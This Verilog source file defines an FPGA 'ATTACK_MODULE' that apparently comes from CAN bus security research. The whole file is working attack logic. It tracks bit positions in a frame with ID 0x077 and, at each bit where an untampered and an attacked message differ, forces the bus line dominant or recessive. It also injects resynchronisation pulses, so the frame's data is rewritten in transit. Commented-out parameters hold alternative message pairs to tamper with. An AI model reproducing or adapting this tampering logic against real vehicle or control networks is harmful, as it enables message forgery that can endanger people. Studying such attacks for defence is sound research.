`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 2019/12/21 13:21:28
// Design Name: 
// Module Name: ATTACK_MODULE
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 
// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////


module ATTACK_MODULE(
    clk,
    rst,
    can_signal_in,
    state,
    attack_state,
    sample_point,
    sample_point_q,
    rsyn_t,
    go_sync,
    cnt1,
    to_dominant,
    to_recessive,
    debug
);

    input clk;
    input rst;
    input can_signal_in;
    input state;
    input attack_state;
    input sample_point;
    input sample_point_q;
    input rsyn_t;
    input go_sync;
    input [7:0]cnt1;
    output to_dominant;
    output to_recessive;
    output debug;

//    parameter UNATTACKED_MSG = 44'b00011001101000001001000001001110000101010110;    //ID:19A,DATA:1のメッセージ
//    parameter ATTACKED_MSG =   44'b00011001101000001001000001000010010011001111;  //ID:19A,DATA:0のメッセージ
//    parameter UNATTACKED_MSG =  44'b00011001101000001001000001000010010011001111;   //ID:19A,DATA:0のメッセージ
//    parameter ATTACKED_MSG =    44'b00011001101000001001000001001110000101010110;  //ID:19A,DATA:1のメッセージ
//    parameter UNATTACKED_MSG = 48'b000001111011100000101000001001101111101011000110;    //ID:077,DATA:01のメッセージ
//    parameter ATTACKED_MSG =   48'b000001111011100000101000001010101010010000011110;  //ID:077,DATA:02のメッセージ
//    parameter ATTACKED_MSG =   48'b000001111011100000101000001101000011101111101010;  //ID:077,DATA:05のメッセージ
//    parameter UNATTACKED_MSG =   48'b000001111011100000101000001010101010010000011110;  //ID:077,DATA:02のメッセージ
//    parameter ATTACKED_MSG = 48'b000001111011100000101000001001101111101011000110;    //ID:077,DATA:01のメッセージ
//    parameter ATTACKED_MSG =   48'b000001111011100000101000001101000011101111101010;  //ID:077,DATA:05のメッセージ
    parameter UNATTACKED_MSG =   48'b000001111011100000101000001101000011101111101010;  //ID:077,DATA:05のメッセージ
    parameter ATTACKED_MSG =     48'b000001111011100000101000001001101111101011000110;    //ID:077,DATA:01のメッセージ
//    parameter ATTACKED_MSG =   48'b000001111011100000101000001010101010010000011110;  //ID:077,DATA:02のメッセージ
//    parameter UNATTACKED_MSG = 47'b00000111101110000010100000101100100010001101010;    //ID:077,DATA:03のメッセージ
//    parameter ATTACKED_MSG =   47'b00000111101110000010100000110010000101110011110;  //ID:077,DATA:04のメッセージ
//    parameter UNATTACKED_MSG =   47'b00000111101110000010100000110010000101110011110;  //ID:077,DATA:04のメッセージ
//    parameter ATTACKED_MSG = 47'b00000111101110000010100000101100100010001101010;    //ID:077,DATA:03のメッセージ
//    parameter MSG_L = 8'd47;
    parameter MSG_L = 8'd48;
//    parameter MSG_L = 8'd44;
//    parameter ATTACK_L = 8'd18;
//    parameter ATTACK_L = 8'd10;   //ID:0x19A, DATA:1のメッセージ改ざん
    wire [7:0]ATTACK_L = cnt1;

//    parameter RSYN_L = 8'd6;   //ID:0x19A, DATA:1のメッセージ改ざん
    parameter RSYN_L = 8'd6;
    
    reg [7:0] bit_cnt;
    reg [7:0] attack_cnt; //クロック16MHzだと1カウント62.5ns ,2カウントで1Tq
    reg ex_attack;
    reg value;
    wire attack_bit; //攻撃bit
    wire attack_bit_q;
    
    assign attack_bit = UNATTACKED_MSG[MSG_L - 1 - bit_cnt] != ATTACKED_MSG[MSG_L - 1 - bit_cnt];
    assign attack_bit_q = UNATTACKED_MSG[MSG_L - bit_cnt] != ATTACKED_MSG[MSG_L - bit_cnt];
    assign to_dominant = ~(attack_state && (ex_attack && value));
    assign to_recessive = ~(attack_state && ((ex_attack && ~value) || ex_rsyn));
    assign debug = value;
    
    always @(posedge clk) begin
        if(~attack_state) begin
            value <= 0;
        end else if(sample_point_q) begin
            value <= UNATTACKED_MSG[MSG_L - 1 - bit_cnt];
        end
    end
    
    always @(posedge clk) begin
        if(~rst) begin
            bit_cnt <= 0;
        end else if(~state) begin
            bit_cnt <= 0;
        end else if(sample_point) begin
            bit_cnt <= bit_cnt + 1;
        end
    end
    
    always @(posedge clk) begin
        if(~rst) begin
            attack_cnt <= 0;
        end else if(attack_cnt == ATTACK_L) begin
            attack_cnt <= 0;
        end else if(ex_attack) begin
            attack_cnt <= attack_cnt + 1;
        end
    end
    
    always @(posedge clk) begin
        if(~rst) begin
            ex_attack <= 0;
        end else if(~state) begin
            ex_attack <= 0;
        end else if(attack_cnt == ATTACK_L) begin
            ex_attack <= 0;
        end else if(attack_bit && sample_point_q) begin
            ex_attack <= 1;
        end
    end
    
    /*再同期用の攻撃信号*/
    reg [7:0] rsyn_cnt;
    reg ex_rsyn;
    
    always @(posedge clk) begin
        if(~rst) begin
            ex_rsyn <= 0;
        end else if(~state) begin
            ex_rsyn <= 0;
        end else if(rsyn_cnt == RSYN_L) begin
            ex_rsyn <= 0;
        end else if(rsyn_t && UNATTACKED_MSG[MSG_L - 1 - bit_cnt] == 0 && UNATTACKED_MSG[MSG_L - bit_cnt] == 1 && !attack_bit_q) begin
            ex_rsyn <= 1;
        end
    end
    
    always @(posedge clk) begin
        if(~rst) begin
            rsyn_cnt <= 0;
        end else if(rsyn_cnt == RSYN_L) begin
            rsyn_cnt <= 0;
        end else if(ex_rsyn) begin
            rsyn_cnt <= rsyn_cnt + 1;
        end
    end
    
endmodule
